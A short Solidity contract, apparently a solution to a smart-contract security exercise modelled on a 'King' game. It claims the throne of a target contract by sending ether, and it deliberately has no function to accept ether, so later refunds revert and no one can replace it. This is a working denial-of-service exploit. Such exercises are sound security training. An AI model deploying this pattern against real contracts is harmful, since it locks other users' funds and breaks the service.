// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // since AttackingKing has no fallback or receive function,
        // king.transfer will fail and revert, preventing refunds
        // and new kings
        contractAddress.call{value: address(this).balance}("");
    }
}
